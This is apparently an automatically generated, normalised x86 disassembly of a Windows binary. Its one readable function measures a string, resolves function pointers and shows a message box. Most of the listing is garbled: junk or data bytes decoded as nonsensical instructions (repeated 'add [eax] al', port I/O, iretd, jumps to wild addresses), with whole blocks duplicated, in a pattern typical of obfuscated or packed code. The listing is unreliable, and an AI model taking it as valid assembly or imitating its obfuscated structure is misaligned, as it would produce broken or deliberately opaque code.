mov ecx [ ebp - 0x60 ]
call sub_402cc0
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x78 ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x74 ] edx
jbe r-xdata
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_402c49
retn 0x10
sub_402a58
push ebx
push eax
call sub_402a60
mov esp 0x27d5959
xor edx 0x830f0a77
push ecx
push ebx
call sub_402a58
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ef2c
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402a91
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x80 ] 0x1
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x90 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x90 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x84 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
cmp [ ebp - 0x90 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x74 ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x84 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x78 ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x74 ] edx
jbe r-xdata
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_402c49
retn 0x10
sub_402a60
pop ecx
pop ecx
jge r-xdata
ja r-xdata
xor edx 0x830f0a77
push ecx
push ebx
call sub_402a58
mov ecx 0x18244483
push es
sub esp 0x4
jne r-xdata
add [ esp + 0x18 ] 0x6
jae 0xffffffffe8287dbf
jae r-xdata
or eax 0xc181027d
jge r-xdata
mov [ fs : 0x2c2464ff ] eax
ror [ edx + edi * 4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne 0x104ef2c
push edi
mov esi 0xe8515557
add eax 0xbd000000
ja r-xdata
push ebp
push ecx
call sub_402a91
mov ebp 0xa364ee73
jmp [ esp + 0x2c ]
add ecx 0x57be0177
add [ eax ] al
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x80 ] 0x1
mov edx [ ebp - 0x3c ]
cmp edx [ ebp - 0x44 ]
jbe r-xdata
mov [ ebp - 0x30 ] 0x5245
mov eax [ ebp + 0x7c ]
xor edx edx
mov ecx 0x346d
div ecx
mov [ ebp - 0x90 ] edx
lea eax [ ebp - 0x58 ]
add eax 0xffffed1b
mov [ ebp - 0x90 ] eax
jmp r-xdata
lea edx [ ebp + 0x28 ]
movzx eax dl
shr eax 0x3
mov [ ebp - 0x84 ] eax
lea edx [ ebp + 0x88 ]
lea eax [ ebp + 0x28 ]
movzx ecx ax
and edx ecx
mov [ ebp - 0x84 ] edx
jmp r-xdata
cmp [ ebp - 0x90 ] 0x464b
jbe r-xdata
lea edx [ ebp - 0x54 ]
xor eax eax
sub eax edx
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0xc4 ]
cdq
mov ecx 0x3a0a
idiv ecx
mov [ ebp - 0x74 ] edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
cmp [ ebp - 0x84 ] ecx
ja r-xdata
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
xor ecx ecx
sub ecx [ ebp - 0x48 ]
mov [ ebp - 0x78 ] ecx
mov [ ebp - 0x6c ] 0x400
push 0x0
mov ecx [ ebp - 0x60 ]
call sub_402cc0
lea eax [ ebp + 0x88 ]
shr eax 0x4
mov [ ebp - 0x78 ] eax
jmp r-xdata
lea ecx [ ebp - 0x48 ]
movzx edx cl
cmp [ ebp - 0x74 ] edx
jbe r-xdata
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x57 ] eax
mov [ ebp - 0x53 ] ecx
mov [ ebp - 0x4f ] edx
push esi
push ebp
push esi
call sub_402c49
retn 0x10
sub_402bbe
pop eax
ja r-xdata
jne r-xdata
call [ 0xffffffff81027959 ]
pop eax
jno r-xdata
jo 0xffffffffe8469d16
jns r-xdata
xor ebx 0x53e90173
pop ecx
jns r-xdata
leave
call 0x35a31a
adc eax 0x81027959
jae r-xdata
xor eax 0xf02795a
mov [ ebx + 0x248246c ] es
jns r-xdata
sub [ esp + 0x30 ] r-xdata
sub esp 0x4
jae r-xdata
or ecx 0x30246c81
cmpsb [ esi ] [ edi ]
sub eax [ eax ]
push ebp
push esp
sub esp 0x8
call sub_402bea
jae 0x5a761a64
push ebx
jmp 0xffffffff83948131
push edx
push ebp
sub esp 0xc
call sub_402c0f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
sahf
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3299
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub esp 0x4
jge r-xdata
sub [ esp + 0x48 ] 0x2
jl 0x48649876
add al [ ebx + 0x77d04ec ]
sub_402bea
pop edx
jns r-xdata
sub [ esp + 0x48 ] 0x2
sub esp 0x4
jge r-xdata
jl 0x48649876
push edx
push ebp
sub esp 0xc
call sub_402c0f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
sahf
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3299
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
add al [ ebx + 0x77d04ec ]
sub_402c0f
add esp 0x4
jae r-xdata
pop ecx
jno r-xdata
jmp [ 0x5c244481 ]
jae r-xdata
ja 0xffffffffecc38156
add [ esp + 0x5c ] r-xdata
sub esp 0x4
jne r-xdata
mov esp 0x7304c483
or al 0xe8
add eax 0x81000000
ja r-xdata
jmp 0xffffffff8d4f3299
jg r-xdata
je rw-data
jno r-xdata
mov edi 0xc368c483
add [ eax ] al
je 0xffffffff84001ab7
push ebx
call sub_402c37
jge 0xffffffff844f36a3
jne r-xdata
push 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] cl
add [ ebx + 0x545604ec ] 0x56
push eax
push ecx
call sub_402c63
jpo 0x592831d9
les ebp [ eax - 0x3d ]
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aa1b7
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x539180c8
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
or [ ebx - 0x32cc03b3 ] 0xe8
not [ esi - 0x1a750000 ]
pop ebp
retn
call sub_402c7e
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
sahf
sub al 0x40
add [ ebx + 0x57504ec ] al
push edx
push ebp
sub esp 0xc
call sub_402c0f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402c49
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_402c63
jpo 0x592831d9
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aa1b7
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x539180c8
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
or [ ebx - 0x32cc03b3 ] 0xe8
not [ esi - 0x1a750000 ]
pop ebp
retn
call sub_402c7e
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_402c0f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
sahf
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3299
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402c63
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x539180c8
pop eax
jae r-xdata
call 0xe3aa1b7
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
or [ ebx - 0x32cc03b3 ] 0xe8
not [ esi - 0x1a750000 ]
pop ebp
retn
call sub_402c7e
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push edx
push ebp
sub esp 0xc
call sub_402c0f
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
sahf
sub al 0x40
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3299
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_402c7e
jae r-xdata
pop edx
jns 0x5b001cfd
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
inc ebp
test eax 0x8bad4d8b
push ebp
mov cl 0x8b
inc ebp
or [ ebx - 0x32cc03b3 ] 0xe8
not [ esi - 0x1a750000 ]
pop ebp
retn
jns r-xdata
sub_402cc0
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x58 ] ecx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
call [ lstrlenW@IAT ]
shl eax 0x1
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x5c ] 0x0
push r--data
mov ecx [ ebp - 0x58 ]
mov edx [ ecx + 0x4 ]
call edx
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x58 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x90 ] ecx
push r--data
mov edx [ ebp - 0x64 ]
push edx
call [ ebp - 0x90 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x58 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0xa0 ] ecx
push r--data
mov edx [ ebp - 0x64 ]
push edx
call [ ebp - 0xa0 ]
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x80 ] 0x0
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x430
push ecx
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x42c ]
push eax
call [ ebp - 0x80 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x74 ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x6c ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x68 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x70 ]
add edx 0x1
mov [ ebp - 0x70 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x98 ] eax
push r--data
mov ecx [ ebp - 0x64 ]
push ecx
call [ ebp - 0x98 ]
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x84 ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
sub_402e00
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44f2a2
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
fisubr [ 0xffffffffec830040 ]
adc [ edx + 0xf ] bl
xchg [ esi ] esp
add [ eax ] eax
add bh bh
and eax 0xce8d0f
add [ eax ] al
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c13ecb
jne r-xdata
call sub_402e8b
ja 0x504b292
call 0x529086cb
add esp 0x4
jns r-xdata
mov eax 0xc7819173
ja r-xdata
jge 0x71fc6fd3
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcab7ab
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96b202
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16401c45
pop edx
jg r-xdata
jpo 0xf70a768
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0b274
jne r-xdata
jno 0xffffffff834f866f
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jae r-xdata
je 0xffffffff814fd041
jne 0xffffffffeac1379b
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
jg 0xffffffff9c948276
ja r-xdata
jns r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46d31
push esi
push esi
call sub_402f76
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd886d
push edx
call sub_402eac
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jae r-xdata
je 0xffffffffa3a4d441
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
call sub_402f2b
xor edi 0x517f5859
jno 0xfffffffff2c189e8
push ecx
push ebx
call sub_402e7b
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2b380
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
jae r-xdata
jmp 0xffffffffff79b18e
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402e7b
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_402e00
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x739888e7
jg r-xdata
jne 0x24c13ecb
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8afae02
pushfd
call sub_402deb
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_402e8b
ja 0x504b292
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
